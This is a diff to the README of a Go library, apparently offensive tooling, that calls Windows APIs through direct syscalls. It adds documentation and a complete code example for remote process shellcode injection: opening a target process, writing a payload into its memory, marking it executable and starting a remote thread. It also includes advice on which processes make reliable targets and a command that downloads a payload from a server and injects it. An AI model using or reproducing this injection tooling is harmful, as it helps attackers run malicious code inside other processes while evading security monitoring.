@@ -146,7 +146,8 @@ The library provides strongly-typed wrappers for common Windows APIs:
 - `NtWaitForSingleObject` - Wait for object signals
 
 **High-Level Functions:**
-- `NtInjectSelfShellcode` - Complete self-injection with CreateThread
+- `NtInjectSelfShellcode` - Complete self-injection using direct syscalls
+- `NtInjectRemote` - Complete remote process injection using direct syscalls
 - `DirectCall` - Call any Windows API function by address
 
 **Security Bypass Functions:**
@@ -911,6 +912,89 @@ if status == 0 {
 
 The library provides `NtInjectSelfShellcode` for complete shellcode self-injection using only direct syscalls. This function performs the full injection process: allocate RW memory → copy shellcode → change to RX → create thread using `NtCreateThreadEx`.
 
+#### Remote Injection Examples
+
+The library also provides `NtInjectRemote` for complete remote process injection using only direct syscalls. This function follows the proven pattern used by traditional CreateRemoteThread techniques but implemented entirely with NT APIs.
+
+**Important Note**: Remote injection can be finicky depending on the target process. Simple processes like `notepad.exe`, `cmd.exe`, or `calc.exe` work reliably. Modern browsers (Chrome, Firefox) and heavily sandboxed applications may fail due to security protections, different DLL base addresses, or missing runtime dependencies. Always test with simple target processes first.
+
+**Example: Remote Injection**
+
+```go
+package main
+
+import (
+    "fmt"
+    "unsafe"
+    winapi "github.com/carved4/go-direct-syscall"
+)
+
+func main() {
+    // Prewarm syscall cache
+    winapi.PrewarmSyscallCache()
+    
+    // Your shellcode bytes
+    shellcode := []byte{/* your payload */}
+    
+    // Target process ID (get this from Task Manager or process enumeration)
+    targetPID := uint32(1234)
+    
+    // Open target process
+    var processHandle uintptr
+    clientId := winapi.CLIENT_ID{
+        UniqueProcess: uintptr(targetPID),
+        UniqueThread:  0,
+    }
+    
+    objAttrs := winapi.OBJECT_ATTRIBUTES{
+        Length: uint32(unsafe.Sizeof(winapi.OBJECT_ATTRIBUTES{})),
+    }
+    
+    // Use specific access rights (more reliable than PROCESS_ALL_ACCESS)
+    desiredAccess := uintptr(winapi.PROCESS_CREATE_THREAD | 
+                            winapi.PROCESS_VM_OPERATION | 
+                            winapi.PROCESS_VM_WRITE | 
+                            winapi.PROCESS_VM_READ | 
+                            winapi.PROCESS_QUERY_INFORMATION)
+    
+    status, err := winapi.NtOpenProcess(
+        &processHandle,
+        desiredAccess,
+        uintptr(unsafe.Pointer(&objAttrs)),
+        uintptr(unsafe.Pointer(&clientId)),
+    )
+    
+    if err != nil || status != winapi.STATUS_SUCCESS {
+        fmt.Printf("Failed to open process: %v\n", err)
+        return
+    }
+    defer winapi.NtClose(processHandle)
+    
+    // Perform remote injection
+    err = winapi.NtInjectRemote(processHandle, shellcode)
+    if err != nil {
+        fmt.Printf("Remote injection failed: %v\n", err)
+    } else {
+        fmt.Println("Remote injection successful!")
+    }
+}
+```
+
+**What NtInjectRemote Does:**
+
+1. **Allocates RW Memory**: Uses `NtAllocateVirtualMemory` with `PAGE_READWRITE` in target process
+2. **Writes Shellcode**: Uses `NtWriteVirtualMemory` to copy payload to remote memory
+3. **Changes Protection**: Uses `NtProtectVirtualMemory` to change memory to `PAGE_EXECUTE_READ`
+4. **Creates Thread**: Uses `NtCreateThreadEx` to execute shellcode in target process
+5. **Fire and Forget**: Closes thread handle immediately (like traditional CreateRemoteThread)
+
+**Process Compatibility Notes:**
+-  **Reliable**: notepad.exe, cmd.exe, calc.exe, simple desktop applications
+-  **Situational**: PowerShell, Windows Terminal, some third-party applications  
+-  **Problematic**: Chrome, Firefox, Edge (sandboxed), protected system processes
+
+The success rate depends heavily on the target process architecture, security policies, and runtime environment. When in doubt, test with notepad.exe first.
+
 **Example 1: Self-Injection with Embedded Shellcode**
 
 ```go
@@ -1017,7 +1101,7 @@ func main() {
 # Self-injection with downloaded shellcode  
 ./go-direct-syscall.exe -url https://your-server.com/payload.bin -self
 
-# Remote injection into another process
+# Remote injection into another process (shows process selection menu)
 ./go-direct-syscall.exe -url https://your-server.com/payload.bin
 ```
 
